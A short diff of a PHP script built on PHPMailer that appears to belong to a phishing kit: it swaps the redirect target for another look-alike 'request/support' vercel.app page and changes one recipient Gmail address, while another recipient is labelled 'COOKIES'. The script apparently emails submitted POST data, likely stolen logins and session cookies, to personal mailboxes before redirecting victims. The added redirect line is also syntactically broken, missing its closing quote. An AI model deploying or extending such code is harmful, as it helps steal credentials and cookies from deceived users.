@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://support-page-here-request-on-servic.vercel.app/");
+header("Location: https://apply-a-free-request-on-show-servic.vercel.app/);
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -35,7 +35,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->addAddress('rutherfordhenress@gmail.com', 'COOKIES');
-        $mail->addAddress('approval.ads.monica.ramey@gmail.com');
+        $mail->addAddress('subhannizamani51@gmail.com');
        
 
 
